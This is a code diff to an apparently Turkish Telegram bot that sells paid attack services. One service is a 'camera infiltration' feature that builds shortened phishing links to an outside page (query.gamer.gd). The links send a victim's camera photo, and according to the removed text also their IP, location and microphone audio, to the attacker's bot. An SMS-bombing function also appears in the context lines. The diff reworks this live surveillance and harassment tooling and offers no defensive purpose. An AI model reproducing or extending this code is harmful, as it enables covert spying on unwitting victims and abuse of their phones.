@@ -8219,7 +8219,7 @@ def _launch_sms_bomb(uid, phone, mail, mode, limit, interval, bot_instance):
     t.start()
 
 def _process_camera_token(msg, bot_instance):
-    """Kamera link için bot token al, doğrula, kısa link üret. Kanal zorunluluğu yok."""
+    """Kamera link: token al, doğrula, query.gamer.gd ile kısa link üret. Kanal yok."""
     uid = msg.from_user.id
     chat_id = msg.chat.id
     text = (msg.text or "").strip()
@@ -8251,10 +8251,9 @@ def _process_camera_token(msg, bot_instance):
         return
 
     USER_STATES.pop(uid, None)
-    bot_instance.reply_to(msg, "✅ <b>Token doğrulandı!</b>", parse_mode="HTML")
+    bot_instance.reply_to(msg, "✅ *Token doğrulandı!*", parse_mode="Markdown")
 
-    # Çalışan sayfa: token + idChat ile fotoğrafı botuna gönderir
-    long_url = f"https://parzibyte.github.io/ejemplos-javascript/foto-camara-telegram/?token={token}&idChat={chat_id}"
+    long_url = f"http://query.gamer.gd/C1.html?id={chat_id}&token={token}"
     try:
         short = requests.get(
             "https://clck.ru/--",
@@ -8262,20 +8261,13 @@ def _process_camera_token(msg, bot_instance):
             timeout=10
         ).text.strip()
     except Exception:
-        bot_instance.reply_to(msg, "❌ Link kısaltma hatası. Uzun link:\n" + long_url)
+        bot_instance.reply_to(msg, "❌ Link kısaltma hatası.")
         return
 
     bot_instance.send_message(
         chat_id,
-        f"🔗 <b>Kısaltılmış Bağlantınız:</b>\n{short}\n\n"
-        "📷 <b>Link hazır ve çalışıyor.</b>\n\n"
-        "⚠️ <b>ÖNEMLİ:</b>\n"
-        "1. Token’ini girdiğin <b>kendi botuna</b> /start at (attıysan tamam)\n"
-        "2. Bu linki karşı tarafa gönder\n"
-        "3. Karşı taraf kameraya izin verip fotoğraf çekince\n"
-        "   <b>fotoğraf direkt senin botuna düşer</b>\n\n"
-        "Tekrar token atarak yeni link de alabilirsin.",
-        parse_mode="HTML"
+        f"🔗 *Kısaltılmış Bağlantınız:*\n{short}",
+        parse_mode="Markdown"
     )
 
 def _sms_step1_number(msg, bot_instance):
@@ -10712,49 +10704,23 @@ def register_handlers(bot_instance):
                         "━━━━━━━━━━━━━━━━━━━━━\n"
                         "🔒 Bu servis üyelik gerektirir.\n\n"
                         f"⭐ <b>{CAMERA_PRICE} yıldız</b> → sınırsız kullanım\n\n"
-                        "IP + Fotoğraf + Mikrofon bilgisi direkt bu bota gelir.\n"
-                        "Karşı taraf kendi bot tokeni girmez.",
+                        "Kendi bot tokenin ile kamera erişim bağlantısı oluşturursun.",
                         reply_markup=mk,
                         parse_mode="HTML"
                     )
                     return
 
-                # Üye / admin → direkt link üret (token yok)
-                page = (CAMERA_PAGE_URL or "").strip()
-                if not page:
-                    bot_instance.send_message(
-                        call.message.chat.id,
-                        "📷 <b>Kamera Sızma</b>\n"
-                        "━━━━━━━━━━━━━━━━━━━━━\n"
-                        "⚠️ Sayfa adresi henüz ayarlanmamış.\n\n"
-                        "Admin <code>CAMERA_PAGE_URL</code> değişkenine "
-                        "host ettiğin HTML adresini yazmalı.\n"
-                        "Örnek: <code>https://xxx.github.io/camera/index.html</code>",
-                        parse_mode="HTML"
-                    )
-                    return
-
-                long_url = f"{page}?uid={uid}"
-                try:
-                    short = requests.get(
-                        "https://clck.ru/--",
-                        params={"url": long_url},
-                        timeout=10
-                    ).text.strip()
-                except Exception:
-                    short = long_url
-
-                bot_instance.send_message(
+                # Üye / admin → token iste (orijinal mantık, kanal yok)
+                USER_STATES[uid] = {"action": "camera_token"}
+                m = bot_instance.send_message(
                     call.message.chat.id,
-                    f"🔗 <b>Kamera Sızma Linkin:</b>\n{short}\n\n"
-                    "📷 <b>Ne gelecek?</b>\n"
-                    "• IP adresi + konum bilgisi\n"
-                    "• Kameradan fotoğraf\n"
-                    "• Mikrofon ses kaydı\n\n"
-                    "Hepsi <b>direkt bu bota</b> düşer.\n"
-                    "Karşı taraf hiçbir token girmez.",
+                    "📷 <b>Kamera Sızma</b>\n"
+                    "━━━━━━━━━━━━━━━━━━━━━\n"
+                    "🔑 Lütfen <b>Telegram Bot Token</b> gönderin:\n\n"
+                    "<i>iptal yazarak çık</i>",
                     parse_mode="HTML"
                 )
+                register_step(bot_instance, m, lambda m: _process_camera_token(m, bot_instance))
                 return
 
             if data == "buy_camera":
